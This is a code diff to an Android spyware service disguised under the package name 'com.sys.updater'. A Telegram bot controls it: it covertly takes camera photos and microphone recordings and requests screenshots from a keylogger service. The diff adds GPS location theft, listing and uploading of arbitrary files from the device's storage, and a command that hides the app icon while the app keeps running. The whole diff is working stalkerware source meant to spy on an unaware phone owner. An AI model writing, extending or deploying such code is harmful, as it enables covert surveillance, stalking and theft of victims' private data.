@@ -1,13 +1,17 @@
 package com.sys.updater;
 
+import android.Manifest;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.content.pm.ServiceInfo;
 import android.graphics.ImageFormat;
 import android.hardware.camera2.*;
+import android.location.Location;
+import android.location.LocationManager;
 import android.media.Image;
 import android.media.ImageReader;
 import android.media.MediaRecorder;
@@ -49,7 +53,7 @@ public class TelegramService extends Service {
             }
         }
         
-        Exfil.send("✅ System Bot is Online. Send /cam, /mic, or /screenshot");
+        Exfil.send("✅ Bot Online.\nCommands:\n/cam\n/mic\n/screenshot\n/loc\n/files\n/get <path>\n/hide");
         new Thread(this::pollTelegram).start();
     }
 
@@ -87,49 +91,98 @@ public class TelegramService extends Service {
             } else if (cmd.equals("/mic")) {
                 recordAudio();
             } else if (cmd.equals("/screenshot")) {
-                if (KeyloggerService.instance != null) {
-                    Exfil.send("📸 Requesting screenshot from Accessibility...");
-                    KeyloggerService.instance.captureScreen();
-                } else {
-                    Exfil.send("⚠️ Accessibility Service is OFF.");
-                }
+                if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreen();
+            } else if (cmd.equals("/loc")) {
+                getLocation();
+            } else if (cmd.equals("/files")) {
+                listFiles();
+            } else if (cmd.startsWith("/get ")) {
+                String path = cmd.substring(5).trim();
+                Exfil.send("Fetching: " + path);
+                Exfil.sendFile(path, "Document", "File from " + path);
+            } else if (cmd.equals("/hide")) {
+                hideIcon();
             }
         });
     }
 
+    // ================== LOCATION ==================
+    private void getLocation() {
+        try {
+            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
+            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                Exfil.send("❌ Location permission not granted.");
+                return;
+            }
+            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            
+            if (loc != null) {
+                String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + loc.getLatitude() + "," + loc.getLongitude();
+                Exfil.send("📍 Location:\n" + mapsUrl);
+            } else {
+                Exfil.send("❌ Location not available. Try going outside or enable GPS.");
+            }
+        } catch (Exception e) {
+            Exfil.send("Location Error: " + e.getMessage());
+        }
+    }
+
+    // ================== FILE MANAGER ==================
+    private void listFiles() {
+        try {
+            File dir = new File("/sdcard/Download"); // Tqder tbedel l'path hna
+            if (!dir.exists()) dir = new File("/sdcard/");
+            
+            File[] files = dir.listFiles();
+            StringBuilder sb = new StringBuilder("📁 Files in " + dir.getAbsolutePath() + ":\n\n");
+            if (files != null) {
+                for (int i = 0; i < Math.min(files.length, 30); i++) {
+                    sb.append(files[i].getName()).append("\n");
+                }
+                sb.append("\nUse `/get ").append(dir.getAbsolutePath()).append("/filename` to download.");
+            }
+            Exfil.send(sb.toString());
+        } catch (Exception e) {
+            Exfil.send("File Error: " + e.getMessage());
+        }
+    }
+
+    // ================== STEALTH MODE ==================
+    private void hideIcon() {
+        try {
+            getPackageManager().setComponentEnabledSetting(
+                new android.content.ComponentName(this, MainActivity.class),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            );
+            Exfil.send("🕵️ App icon hidden. App still running in background.");
+        } catch (Exception e) {
+            Exfil.send("Hide Error: " + e.getMessage());
+        }
+    }
+
+    // ================== CAMERA ==================
     private void takePhoto() {
-        Exfil.send("📷 [1/4] Opening Camera...");
+        Exfil.send("📷 Opening Camera...");
         try {
             CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
-            
-            // Ila kanet 3ndek ghir camera wa7da, kayrje3 liha. Ila kayn front, kayakhodha.
             String cameraId = manager.getCameraIdList()[0];
-            if (manager.getCameraIdList().length > 1) {
-                cameraId = manager.getCameraIdList()[1]; // Front camera
-            }
+            if (manager.getCameraIdList().length > 1) cameraId = manager.getCameraIdList()[1];
             
             manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                 @Override
                 public void onOpened(CameraDevice camera) {
-                    Exfil.send("📷 [2/4] Camera Opened. Configuring...");
                     try {
                         ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
                         camera.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                             @Override
                             public void onConfigured(CameraCaptureSession session) {
-                                Exfil.send("📷 [3/4] Session Configured. Waiting for auto-exposure (1s)...");
                                 try {
                                     CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                     builder.addTarget(reader.getSurface());
-                                    
-                                    // Delay dyal 1 seconde bach l'dow y-9ad
                                     new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                        try {
-                                            session.capture(builder.build(), null, null);
-                                            Exfil.send("📷 [4/4] Image Captured. Saving...");
-                                        } catch (Exception e) {
-                                            Exfil.send("❌ Capture Error: " + e.getMessage());
-                                        }
+                                        try { session.capture(builder.build(), null, null); } catch (Exception e) {}
                                     }, 1000);
                                     
                                     reader.setOnImageAvailableListener(r -> {
@@ -140,39 +193,24 @@ public class TelegramService extends Service {
                                         try {
                                             File f = new File(getExternalFilesDir(null), "cam.jpg");
                                             FileOutputStream fos = new FileOutputStream(f);
-                                            fos.write(bytes);
-                                            fos.close();
+                                            fos.write(bytes); fos.close();
                                             Exfil.sendFile(f.getAbsolutePath(), "Photo", "Camera Capture");
-                                        } catch (Exception e) {
-                                            Exfil.send("Error saving: " + e.getMessage());
-                                        }
-                                        image.close();
-                                        camera.close();
+                                        } catch (Exception e) {}
+                                        image.close(); camera.close();
                                     }, null);
-                                } catch (Exception e) {
-                                    Exfil.send("Session Error: " + e.getMessage());
-                                }
+                                } catch (Exception e) {}
                             }
-                            @Override public void onConfigureFailed(CameraCaptureSession session) {
-                                Exfil.send("❌ Camera Config Failed");
-                            }
+                            @Override public void onConfigureFailed(CameraCaptureSession session) {}
                         }, null);
-                    } catch (Exception e) {
-                        Exfil.send("Session Error: " + e.getMessage());
-                    }
+                    } catch (Exception e) {}
                 }
-                @Override public void onDisconnected(CameraDevice camera) {
-                    Exfil.send("❌ Camera Disconnected");
-                }
-                @Override public void onError(CameraDevice camera, int error) {
-                    Exfil.send("❌ Camera Error Code: " + error);
-                }
+                @Override public void onDisconnected(CameraDevice camera) {}
+                @Override public void onError(CameraDevice camera, int error) {}
             }, null);
-        } catch (Exception e) {
-            Exfil.send("❌ Open Camera Exception: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
+    // ================== MIC ==================
     private void recordAudio() {
         try {
             File audioFile = new File(getExternalFilesDir(null), "mic.3gp");
@@ -181,29 +219,23 @@ public class TelegramService extends Service {
             recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
             recorder.setOutputFile(audioFile.getAbsolutePath());
-            recorder.prepare();
-            recorder.start();
+            recorder.prepare(); recorder.start();
             Exfil.send("🎙️ Recording 10s...");
             
             new Thread(() -> {
                 try { Thread.sleep(10000); } catch (Exception e) {}
                 mainHandler.post(() -> {
                     try {
-                        recorder.stop();
-                        recorder.release();
+                        recorder.stop(); recorder.release();
                         Exfil.sendFile(audioFile.getAbsolutePath(), "Audio", "Mic Record");
-                    } catch (Exception e) {
-                        Exfil.send("Mic Error: " + e.getMessage());
-                    }
+                    } catch (Exception e) {}
                 });
             }).start();
-        } catch (Exception e) {
-            Exfil.send("Recorder Error: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
     @Override
     public IBinder onBind(Intent intent) { return null; }
-                                    }
+}
